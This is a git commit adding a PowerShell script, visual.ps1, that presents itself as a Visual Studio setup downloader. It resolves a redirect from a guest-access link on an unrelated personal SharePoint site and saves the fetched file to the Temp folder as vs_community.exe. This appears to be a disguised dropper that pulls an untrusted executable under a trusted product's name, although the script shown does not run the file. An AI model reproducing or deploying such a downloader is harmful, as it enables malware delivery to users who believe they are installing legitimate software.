39d38f5952cabf1e6010ed6770bec31277ab1a35
selvim12 <selviloves@gmail.com>
2017-05-29 16:44:23 +0530

    Add files via upload

---
+++ visual.ps1
@@ -0,0 +1,31 @@
+﻿Function Get-RedirectedUrl
+{
+    Param (
+        [Parameter(Mandatory=$true)]
+        [String]$URL
+    )
+ 
+    $request = [System.Net.WebRequest]::Create($url)
+    $request.AllowAutoRedirect=$false
+    $response=$request.GetResponse()
+ 
+    If ($response.StatusCode -eq "Found")
+    {
+        $response.GetResponseHeader("Location")
+    }
+}
+
+$url = 'https://cheekandchongsupinthesmoke-my.sharepoint.com/personal/bulletformyvalentine_cheekandchongsupinthesmoke_onmicrosoft_com/_layouts/15/guestaccess.aspx?docid=1197a59ab31594530b932e6fa1b79ea0e&authkey=AQJTZdnA_Y4J7gnCeW6wtsM'
+$codeSetupUrl = Get-RedirectedUrl -URL $url
+
+$vscodeSetup = "${env:Temp}\vs_community.exe"
+
+try
+{
+    (New-Object System.Net.WebClient).DownloadFile($codeSetupUrl, $vscodeSetup)
+}
+catch
+{
+    Write-Error "Failed to download VSCode Setup"
+}
+
